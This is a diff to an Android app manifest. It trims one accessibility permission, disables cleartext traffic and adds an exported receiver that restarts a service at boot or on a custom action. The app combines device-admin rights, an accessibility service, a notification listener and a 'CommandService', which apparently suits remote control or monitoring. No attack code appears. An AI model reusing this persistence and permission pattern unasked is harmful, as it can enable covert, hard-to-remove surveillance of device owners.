@@ -91,10 +91,8 @@
     <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN"
         tools:ignore="ProtectedPermissions" />
 
-    <!-- ============ ACCESSIBILITY (2) ============ -->
+    <!-- ============ ACCESSIBILITY (1) ============ -->
     <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"
-        tools:ignore="ProtectedPermissions" />
-    <uses-permission android:name="android.permission.ACCESSIBILITY_SERVICE"
         tools:ignore="ProtectedPermissions" />
 
     <!-- ============ NOTIFICATION LISTENER (1) ============ -->
@@ -129,12 +127,14 @@
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
         android:theme="@style/Theme.CSK4"
-        android:usesCleartextTraffic="true"
+        android:usesCleartextTraffic="false"
         android:networkSecurityConfig="@xml/network_security_config"
         android:requestLegacyExternalStorage="true"
         android:largeHeap="true"
+        android:hardwareAccelerated="true"
         tools:targetApi="31">
 
+        <!-- ============ ACTIVITIES ============ -->
         <activity android:name=".SplashActivity"
             android:exported="true"
             android:theme="@style/Theme.CSK4.Splash">
@@ -146,9 +146,11 @@
 
         <activity android:name=".PermissionActivity" android:exported="false" />
         <activity android:name=".LoginActivity" android:exported="false" />
-        <activity android:name=".MainActivity" android:exported="false" />
+        <activity android:name=".MainActivity" android:exported="false"
+            android:launchMode="singleTop" />
         <activity android:name=".WebViewActivity" android:exported="false" />
 
+        <!-- ============ SERVICES ============ -->
         <service
             android:name=".CommandService"
             android:enabled="true"
@@ -185,6 +187,7 @@
             </intent-filter>
         </service>
 
+        <!-- ============ RECEIVERS ============ -->
         <receiver
             android:name=".DeviceAdminReceiver"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
@@ -222,6 +225,16 @@
             </intent-filter>
         </receiver>
 
+        <receiver
+            android:name=".AutoRestartReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="com.csk4.app.RESTART_SERVICE" />
+            </intent-filter>
+        </receiver>
+
+        <!-- ============ FILE PROVIDER ============ -->
         <provider
             android:name="androidx.core.content.FileProvider"
             android:authorities="${applicationId}.provider"
